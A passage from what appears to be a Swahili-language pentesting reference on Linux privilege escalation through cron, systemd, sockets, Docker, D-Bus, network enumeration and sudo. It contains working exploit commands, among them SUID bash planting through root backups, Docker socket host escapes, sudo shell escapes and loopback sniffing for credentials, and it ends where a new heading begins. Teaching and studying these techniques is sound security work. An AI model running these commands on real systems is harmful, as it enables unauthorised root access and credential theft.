- `mkstemp()`: unda faili za muda atomically zikiwa na ruhusa salama.

### Binaries za cron zilizosainiwa maalum zenye payloads zinazoweza kuandikwa
Mtumiaji wa kawaida anayeweza kuandika binary halisi inayoendeshwa na cron job ya root anaweza kuvuka mpaka wa ruhusa, lakini ukaguzi maalum wa saini unaweza kukataa mbadala ambao haujasainiwa. Katika kisa kilichorekodiwa, ELF iliyomilikiwa na root ilikuwa na mode `0760`, ikiruhusu mshiriki wa kundi lake kuiandika huku mmiliki wa root akiweza kuiendesha. Ufuatiliaji wa mchakato ulioonekana ulionyesha `objcopy` ikitoa `.text_sig` kabla ya job kuendesha binary; script kamili ya uthibitishaji haikuweza kusomwa.<sup>[[2]](#references)</sup>

Mbadala uliofanikiwa ulisainiwa kwa kutumia nyenzo za faragha za kusaini zilizovuja, kupitia ELF signer. [Nyaraka za fomati yake](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) zinaeleza sehemu ya saini inayotokana na `.text` ya executable. Kuongeza tu certificate au string inayolingana kwenye `.text_sig` hakujathibitishwa kukidhi verifier isiyoonekana. Kagua njia halisi iliyoratibiwa, ruhusa halisi za kuandika, uendeshaji wa root na sera ya verifier kabla ya kuhitimisha kuwa binary inayoweza kuandikwa na kusainiwa inaweza kutumiwa vibaya. Sehemu ya `.text_sig` pekee ni kidokezo tu cha kuchunguza.

### Cron jobs za mara kwa mara

Unaweza kufuatilia michakato ili kutafuta michakato inayoendeshwa kila baada ya dakika 1, 2 au 5. Huenda ukaweza kuitumia na kuongeza ruhusa zako.

Kwa mfano, ili **kufuatilia kila sekunde 0.1 kwa dakika 1**, **kupanga kwa amri zilizotekelezwa mara chache zaidi** na kufuta amri zilizotekelezwa mara nyingi zaidi, unaweza kufanya hivi:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayoanza).

### Backups za root zinazohifadhi mode bits zilizowekwa na mshambuliaji (pg_basebackup)

Ikiwa cron inayomilikiwa na root inatumia `pg_basebackup` (au nakala nyingine ya kujirudia) kwenye directory ya database ambayo unaweza kuiandikia, unaweza kuweka **SUID/SGID binary** ambayo itanukuliwa tena kama **root:root**, ikiwa na mode bits zilezile, kwenye matokeo ya backup.<sup>[[26]](#references)</sup>

Mtiririko wa kawaida wa ugunduzi (ukiwa mtumiaji wa DB mwenye ruhusa ndogo):
- Tumia `pspy` kuona cron ya root ikiita kitu kama `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` kila dakika.
- Thibitisha kuwa unaweza kuandika kwenye source cluster (kwa mfano, `/var/lib/postgresql/14/main`) na kwamba destination (`/opt/backups/current`) inakuwa inamilikiwa na root baada ya job.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Hii hufanya kazi kwa sababu `pg_basebackup` huhifadhi bits za ruhusa za faili wakati wa kunakili cluster; inapoendeshwa na root, faili lengwa hurithi **umiliki wa root + SUID/SGID iliyochaguliwa na mshambuliaji**. Taratibu zozote za kuhifadhi nakala/kunakili zenye upendeleo zinazohifadhi ruhusa na kuandika kwenye eneo linaloweza kutekelezwa zinaweza kuwa hatarini.

### Kazi za cron zisizoonekana

Inawezekana kuunda cronjob **kwa kuweka carriage return baada ya maoni** (bila herufi ya mstari mpya), na cron job itafanya kazi. Mfano (zingatia herufi ya carriage return):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Ili kugundua aina hii ya ingizo fiche, kagua faili za cron kwa kutumia zana zinazoonyesha herufi za udhibiti:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Angalia kama unaweza kuandika kwenye faili yoyote ya `.service`. Ukiweza, **unaweza kuibadilisha** ili **itekeleze** **backdoor yako huduma** **inapoanzishwa**, **inapoanzishwa upya** au **inaposimamishwa** (huenda ukahitaji kusubiri hadi mashine iwashwe upya).\
Kwa mfano, unda backdoor yako ndani ya faili la .service ukitumia **`ExecStart=/tmp/script.sh`**

### Binaries za huduma zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **ruhusa za kuandika kwenye binaries zinazotekelezwa na huduma**, unaweza kuzibadilisha na backdoors ili huduma zinapoendeshwa tena, backdoors zitekelezwe.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumiwa na **systemd** kwa kutumia:

```bash
systemctl show-environment
```

Ukipata kuwa unaweza **kuandika** kwenye folda yoyote ya njia hiyo, unaweza kuweza **escalate privileges**. Unahitaji kutafuta **relative paths zinazotumika kwenye faili za service configurations**, kama vile:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Kisha, tengeneza **executable** yenye **jina sawa na binary ya relative path** ndani ya folda ya systemd PATH unayoweza kuandikia. Huduma ikiombwa kutekeleza kitendo kilicho hatarini (**Start**, **Stop**, **Reload**), **backdoor** yako itatekelezwa (kwa kawaida, watumiaji wasio na ruhusa za juu hawawezi kuanzisha/kusimamisha huduma, lakini angalia kama unaweza kutumia `sudo -l`).

**Pata maelezo zaidi kuhusu huduma kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni faili za systemd unit ambazo majina yake huishia kwa `**.timer**` na ambazo hudhibiti faili za `**.service**` au matukio. **Timers** zinaweza kutumika badala ya cron kwa kuwa zina usaidizi wa ndani wa matukio ya muda wa kalenda na matukio ya muda unaopimwa mfululizo, na zinaweza kuendeshwa kwa njia ya asynchronous.

Unaweza kuorodhesha timers zote kwa kutumia:

```bash
systemctl list-timers --all
```

### Timers zinazoweza kuandikwa

Ukiweza kurekebisha timer, unaweza kuifanya itekeleze baadhi ya systemd.unit zilizopo (kama `.service` au `.target`).

```bash
Unit=backdoor.service
```

Katika nyaraka unaweza kusoma maelezo ya Unit:

> Unit itakayowashwa muda wa timer unapoisha. Hoja ni jina la unit, bila kiambishi tamati ".timer". Ikiwa halijabainishwa, thamani hii huwa service yenye jina sawa na unit ya timer, isipokuwa kiambishi tamati. (Tazama hapo juu.) Inapendekezwa kuwa jina la unit inayowashwa na jina la unit ya timer yafanane, isipokuwa viambishi tamati.

Kwa hiyo, ili kutumia vibaya ruhusa hii, utahitaji:

- Kutafuta systemd unit (kama `.service`) ambayo **inaendesha binary inayoweza kuandikwa**
- Kutafuta systemd unit ambayo **inaendesha njia ya relative** na una **ruhusa za kuandika** kwenye **systemd PATH** (ili kuiga executable hiyo)

**Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.**

### **Kuwasha Timer**

Ili kuwasha timer, unahitaji ruhusa za root na utekeleze:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Kumbuka **timer** **huwashwa** kwa kuunda symlink inayoelekeza kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) huwezesha **mawasiliano kati ya michakato** kwenye mashine moja au tofauti ndani ya miundo ya client-server. Hutumia faili za kawaida za Unix descriptor kwa mawasiliano kati ya kompyuta na husanidiwa kupitia faili za `.socket`.<sup>[[14]](#references)</sup>

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kwa kutumia `man systemd.socket`.** Ndani ya faili hii, kuna vigezo kadhaa vya kuvutia vinavyoweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguo hizi hutofautiana, lakini kwa muhtasari hutumika **kuonyesha mahali itakaposikilizia** socket (njia ya faili ya AF_UNIX socket, nambari ya IPv4/6 na/au port itakayosikilizwa, n.k.)
- `Accept`: Hupokea thamani ya boolean. Ikiwa ni **true**, **service instance huanzishwa kwa kila muunganisho unaoingia** na hupokea socket ya muunganisho pekee. Ikiwa ni **false**, sockets zote zinazozingatia miunganisho **hukabidhiwa kwa service unit inayoanzishwa**, na service unit moja pekee huanzishwa kwa miunganisho yote. Thamani hii hupuuzwa kwa datagram sockets na FIFOs ambapo service unit moja hushughulikia trafiki yote inayoingia bila masharti. **Chaguo-msingi ni false**. Kwa sababu za utendaji, inashauriwa kuandika daemons mpya kwa namna inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Hupokea mstari mmoja au zaidi wa amri, ambao **hutekelezwa kabla** au **baada ya** listening **sockets**/FIFOs **kuundwa** na kuunganishwa, mtawalia. Tokeni ya kwanza ya mstari wa amri lazima iwe jina kamili la faili, likifuatiwa na argument za mchakato.
- `ExecStopPre`, `ExecStopPost`: **Amri** za ziada ambazo **hutekelezwa kabla** au **baada ya** listening **sockets**/FIFOs **kufungwa** na kuondolewa, mtawalia.
- `Service`: Hubainisha jina la **service unit** **litakaloanzishwa** kunapotokea **trafiki inayoingia**. Mpangilio huu unaruhusiwa tu kwa sockets zenye Accept=no. Chaguo-msingi ni service yenye jina sawa na socket (lakini suffix imebadilishwa). Katika hali nyingi, haipaswi kuwa muhimu kutumia chaguo hili.

### Faili za .socket zinazoweza kuandikwa

Ukipata faili ya `.socket` **inayoweza kuandikwa**, unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla ya socket kuundwa. Kwa hiyo, **huenda ukahitaji kusubiri hadi mashine iwashwe upya.**\
_Kumbuka kwamba mfumo lazima uwe unatumia usanidi huo wa faili ya socket, la sivyo backdoor haitatekelezwa_

### Socket activation + njia ya unit inayoweza kuandikwa (unda service inayokosekana)

Usanidi mwingine wenye athari kubwa ni:

- socket unit yenye `Accept=no` na `Service=<name>.service`
- service unit inayorejelewa haipo
- mshambuliaji anaweza kuandika kwenye `/etc/systemd/system` (au njia nyingine ya utafutaji wa unit)

Katika hali hiyo, mshambuliaji anaweza kuunda `<name>.service`, kisha kusababisha trafiki kwenye socket ili systemd ipakie na kutekeleza service mpya kama root.

Mtiririko wa haraka:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Sockets Zinazoweza Kuandikiwa

Ukitambua **socket yoyote inayoweza kuandikiwa** (_hapa tunazungumzia Unix Sockets, si faili za usanidi za `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na pengine kutumia vulnerability.

### Orodhesha Unix Sockets

```bash
netstat -a -p --unix
```

### Muunganisho ghafi

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Mfano wa exploitation:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kuwa kunaweza kuwa na baadhi ya **sockets zinazosikiliza** maombi ya HTTP (_simaanishi faili za .socket, bali faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa kutumia:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Ikiwa socket **itajibu kwa HTTP** request, basi unaweza **kuwasiliana** nayo na huenda uka-**exploit vulnerability fulani**.

### Writable Docker Socket

Docker socket, ambayo mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu inayopaswa kulindwa. Kwa chaguomsingi, inaweza kuandikwa na mtumiaji wa `root` na wanachama wa kundi la `docker`. Kuwa na ruhusa ya kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna maelezo ya jinsi hili linavyoweza kufanywa na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation with Docker CLI**

Ikiwa una ruhusa ya kuandika kwenye Docker socket, unaweza kufanya privilege escalation kwa kutumia amri zifuatazo:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Amri hizi zinakuruhusu kuendesha container yenye ufikiaji wa root kwenye mfumo wa faili wa host.

#### **Kutumia Docker API Moja kwa Moja**

Katika hali ambapo Docker CLI haipatikani, bado unaweza kutumia vibaya socket ya Docker kupitia HTTP ghafi kwenye Unix socket. Mfuatano unaotegemewa zaidi ni:

- tengeneza container saidizi ya muda mrefu yenye host root iliyowekwa kama bind mount
- ianzishe
- tengeneza instance ya `exec` ndani ya container hiyo saidizi
- anzisha instance ya `exec` na usome matokeo kupitia API

**Orodhesha Docker images**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Unda na uanzishe kontena saidizi**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Unda instance ya exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Anzisha exec instance na usome matokeo**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Muundo huu kwa kawaida ni thabiti zaidi kuliko kujaribu kuendesha `attach` mwenyewe kwa kutumia `socat` au `nc -U`. Ukishoweza kuunda helper kwa kutumia `/:/host`, unaweza kutumia instances za ziada za `exec` kusoma faili kama `/host/root/...`, kuongeza SSH keys chini ya `/host/root/.ssh`, au kurekebisha faili za uanzishaji wa host.

### Nyingine

Kumbuka kwamba ikiwa una ruhusa za kuandika kwenye docker socket kwa sababu uko **ndani ya group `docker`**, una [**njia zaidi za kuongeza privileges**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API inasikiliza kwenye port**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), unaweza pia kuikompromiti.

Angalia **njia zaidi za kutoroka kutoka kwenye containers au kutumia vibaya container runtimes ili kuongeza privileges** katika:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Kuongeza privileges kupitia Containerd (ctr)

Ukigundua kuwa unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwa kuwa **unaweza kuitumia vibaya ili kuongeza privileges**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Kuongeza privileges kupitia **RunC**

Ukigundua kuwa unaweza kutumia amri ya **`runc`**, soma ukurasa ufuatao kwa kuwa **unaweza kuitumia vibaya ili kuongeza privileges**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni **mfumo wa mawasiliano baina ya processes (IPC)** wa kisasa unaowezesha applications kuwasiliana na kushiriki data kwa ufanisi. Ukiundwa kwa kuzingatia mfumo wa kisasa wa Linux, unatoa mfumo imara wa aina mbalimbali za mawasiliano ya applications.<sup>[[16]](#references)</sup>

Mfumo huu una matumizi mengi na unaunga mkono IPC ya msingi inayoboresha ubadilishanaji wa data kati ya processes, sawa na **UNIX domain sockets zilizoboreshwa**. Pia, husaidia kutangaza events au signals, hivyo kurahisisha muunganisho kati ya vipengele vya mfumo. Kwa mfano, signal kutoka kwa Bluetooth daemon kuhusu simu inayoingia inaweza kufanya music player ipunguze sauti, na hivyo kuboresha matumizi ya mtumiaji. Zaidi ya hayo, D-Bus inaunga mkono mfumo wa remote objects, unaorahisisha maombi ya services na miito ya methods kati ya applications, na kurahisisha michakato ambayo kwa kawaida ilikuwa changamano.

D-Bus hutumia **modeli ya kuruhusu/kukataa**, inayosimamia ruhusa za messages (miito ya methods, utumaji wa signals, n.k.) kulingana na athari ya jumla ya policy rules zinazolingana. Policies hizi hubainisha mwingiliano na bus, na zinaweza kuruhusu kuongeza privileges kwa kutumia vibaya ruhusa hizi.

Mfano wa policy kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukieleza ruhusa za mtumiaji root kumiliki, kutuma messages kwa, na kupokea messages kutoka kwa `fi.w1.wpa_supplicant1`.

Policies ambazo hazibainishi mtumiaji au group hutumika kwa wote, ilhali policies za muktadha wa "default" hutumika kwa wote ambao hawajashughulikiwa na policies nyingine maalum.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Jifunze jinsi ya kufanya enumerate na kutumia vibaya mawasiliano ya D-Bus hapa:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Daima inafurahisha kufanya enumerate mtandao na kubaini mahali mashine ilipo.

### Enumeration ya jumla

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Ikiwa ingizo linalotumika la `/etc/inetd.conf` linaendesha GNU Inetutils `telnetd` kama root, angalia toleo la binary iliyosanidiwa na listener ya ndani hata kama port imefungwa kwenye loopback pekee. GNU Inetutils 1.9.3 hadi 2.7 zilikuwa na [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89), ambapo `USER` iliyotolewa na client ilifikishwa kwa `login -f` (CVE-2026-24061). Mchakato au mfuatano wa toleo ni kiashiria; thibitisha hali ya vendor patch na daemon halisi kabla ya kuichukulia kuwa imeathirika. [Mwongozo wa Telnet](../../../network-services-pentesting/pentesting-telnet.md) una maelezo zaidi.

### Uchunguzi wa haraka wa uchujaji wa trafiki inayotoka

Ikiwa host inaweza kutekeleza commands lakini callbacks zinashindwa, tofautisha haraka uchujaji wa DNS, transport, proxy na route:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Porti zilizo wazi

Kabla ya kupata ufikiaji wa mashine, kagua kila mara huduma za mtandao zinazoendesha humo ambazo hukuweza kuwasiliana nazo hapo awali:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Panga listeners kulingana na anwani ya bind:

- `0.0.0.0` / `[::]`: ziko wazi kwenye interfaces zote za ndani.
- `127.0.0.1` / `::1`: zinapatikana kwenye mashine ya ndani pekee (zinafaa kwa tunnel/forward).
- IP mahususi za ndani (kwa mfano `10.x`, `172.16/12`, `192.168.x`, `fe80::`): kwa kawaida zinafikiwa tu kutoka kwenye sehemu za mtandao wa ndani.

### Mtiririko wa triage ya huduma za ndani pekee

Unapocompromise host, huduma zilizofungwa kwenye `127.0.0.1` mara nyingi huwa zinafikiwa kwa mara ya kwanza kupitia shell yako. Mtiririko mfupi wa kazi za ndani ni:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS kama network scanner (network-only mode)

Mbali na ukaguzi wa PE wa ndani, linPEAS inaweza kufanya kazi kama network scanner maalum. Hutumia binaries zinazopatikana kwenye `$PATH` (kwa kawaida `fping`, `ping`, `nc`, `ncat`) na haisakinishi zana.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Ukipitisha `-d`, `-p`, au `-i` bila `-t`, linPEAS hufanya kazi kama network scanner pekee (huruka ukaguzi mwingine wote wa privilege escalation).

### Sniffing

Angalia kama unaweza kunasa trafiki. Ukiweza, huenda ukaweza kupata credentials.

```
timeout 1 tcpdump
```

Ukaguzi wa vitendo wa haraka:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) ni muhimu sana katika post-exploitation kwa sababu huduma nyingi za ndani pekee hufichua tokens/cookies/credentials hapo:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Nasa sasa, changanua baadaye:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Watumiaji

### Uhesabuji wa Jumla

Angalia **wewe ni nani**, una **privileges** gani, ni **watumiaji** gani waliopo kwenye mifumo, ni nani anayeweza **login**, na ni nani aliye na **root privileges:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na hitilafu inayowaruhusu watumiaji wenye **UID > INT_MAX** kupandisha priviliji. Maelezo zaidi: [hapa](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hapa](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [hapa](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Itumie exploit** kwa kutumia: **`systemd-run -t /bin/bash`**

### Makundi

Angalia kama wewe ni **mwanachama wa kundi fulani** linaloweza kukupa haki za root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Ubao wa kunakili

Angalia kama kuna kitu chochote cha kuvutia ndani ya ubao wa kunakili (ikiwezekana)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Sera ya Nenosiri

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Nywila zinazojulikana

Ikiwa **unajua nywila yoyote** ya mazingira, **jaribu kuingia kama kila mtumiaji** kwa kutumia nywila hiyo.

### Su Brute

Ikiwa hujali kufanya kelele nyingi na binary za `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu kufanya brute-force kwa mtumiaji ukitumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) yenye parameta `-a` pia hujaribu kufanya brute-force kwa watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ukigundua kuwa unaweza **kuandika ndani ya folda fulani ya $PATH**, unaweza kuongeza privileges kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** na kuipa jina la amri ambayo itatekelezwa na mtumiaji mwingine (ikiwezekana root), na ambayo **haipakuliwi kutoka kwenye folda iliyo kabla ya folda yako inayoweza kuandikwa kwenye $PATH**.

### SUDO na SUID

Huenda ukaruhusiwa kutekeleza amri fulani kwa kutumia sudo, au amri hizo zinaweza kuwa na biti ya suid. Iangalie kwa kutumia:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Baadhi ya **amri zisizotarajiwa hukuruhusu kusoma na/au kuandika faili au hata kutekeleza amri**.<sup>[[8]](#references)</sup> Kwa mfano:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Mipangilio ya Sudo inaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia haki za mtumiaji mwingine bila kujua nenosiri.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Katika mfano huu, mtumiaji demo anaweza kuendesha vim kama root; sasa ni rahisi sana kupata shell kwa kuongeza ssh key kwenye saraka ya root au kwa kuita sh.

```
sudo vim -c '!sh'
```

### Ulinganisho wa Bash bila kuweka alama za kunukuu kwenye script ya sudo

Katika Bash, upande wa kulia wa `[[ "$protected" == $candidate ]]` ni pattern. Ikiwa script ya sudo yenye uwezo wa root inajaza `candidate` kutoka kwenye faili inayodhibitiwa na mpigaji, thamani kama `prefix*` inaweza kulingana na mwanzo wa mfuatano uliolindwa. Njia tofauti za mafanikio na hitilafu zinaweza kufichua prefix oracle. Weka alama za kunukuu kwenye upande wa kulia (`[[ "$protected" == "$candidate" ]]`) pale ambapo unakusudia ulinganisho halisi. Kagua hoja halisi za sudo, chanzo cha ingizo, na tabia ya matawi inayoonekana kabla ya kuhitimisha kuwa ulinganisho usio na alama za kunukuu unaweza kutumiwa vibaya. [Mwongozo wa GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) unaeleza tabia hii ya pattern.

### Faili za mradi za PrusaSlicer chini ya sudo

